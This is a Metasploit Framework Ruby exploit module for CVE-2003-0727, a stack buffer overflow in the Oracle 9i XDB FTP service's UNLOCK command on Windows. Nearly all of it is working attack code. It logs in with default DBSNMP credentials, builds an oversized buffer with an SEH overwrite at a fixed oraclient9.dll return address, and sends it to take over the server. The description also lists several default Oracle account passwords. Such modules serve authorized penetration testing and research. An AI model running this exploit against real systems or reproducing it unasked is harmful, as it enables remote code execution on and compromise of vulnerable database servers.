##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Ftp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Oracle 9i XDB FTP UNLOCK Overflow (win32)',
			'Description'    => %q{
				By passing an overly long token to the UNLOCK command, a
				stack based buffer overflow occurs. David Litchfield, has
				illustrated multiple vulnerabilities in the Oracle 9i XML
				Database (XDB), during a seminar on "Variations in exploit
				methods between Linux and Windows" presented at the Blackhat
				conference. Oracle9i includes a number of default accounts,
				including dbsnmp:dbsmp, scott:tiger, system:manager, and
				sys:change_on_install.
					
			},
			'Author'         => [ 'MC', 'David Litchfield <david@ngssoftware.com>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2003-0727'],
					[ 'OSVDB', '2449'],
					[ 'BID', '8375'],
					[ 'URL', 'http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf'],

				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},	
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x20\x0a\x0d",
					'StackAdjustment' => -3500,

				},
			'Targets'        => 
				[
					[ 
						'Oracle 9.2.0.1 Universal',
						{
							'Platform' => 'win',
							'Ret'      => 0x60616d46, # oraclient9.dll (pop/pop/ret) 
						},
					],
				],
			'DisclosureDate' => 'Aug 18 2003',
			'DefaultTarget' => 0))

			register_options( [
						Opt::RPORT(2100),
						OptString.new('FTPUSER', [ false, 'The username to authenticate as', 'DBSNMP']),
						OptString.new('FTPPASS', [ false, 'The password to authenticate with', 'DBSNMP']),
					], self.class )
	end

	def check
		connect
		disconnect	
		if (banner =~ /9\.2\.0\.1\.0/)
			return Exploit::CheckCode::Vulnerable
		end		
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect_login
		
		print_status("Trying target #{target.name}...")

		buf          = rand_text_english(1130, payload_badchars)
		seh          = generate_seh_payload(target.ret) 
		buf[322, seh.length] = seh

		send_cmd( ['UNLOCK', '/', buf] , false )
		
		handler
		disconnect
	end

end